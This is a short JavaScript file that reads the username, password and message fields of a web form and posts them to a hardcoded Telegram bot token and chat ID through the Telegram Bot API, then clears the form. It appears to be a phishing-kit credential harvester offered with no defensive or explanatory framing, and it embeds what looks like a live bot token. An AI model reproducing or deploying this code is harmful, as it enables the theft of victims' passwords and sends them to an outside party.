//bot token
var telegram_bot_id = "5618597143:AAE2j2MEiYfwFy-80ELc7bo039cuzhXEvDg";
//chat id
var chat_id = 5361641680;
var Username, passwords, message;
var ready = function () {
    Username = document.getElementById("Username").value;
    passwords = document.getElementById("passwords").value;
    message = document.getElementById("message").value;
    message = "Username: " + Username + "\passwords: " + passwords + "\nMessage: " + message;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("Username").value = "";
    document.getElementById("passwords").value = "";
    document.getElementById("message").value = "";
    return false;
};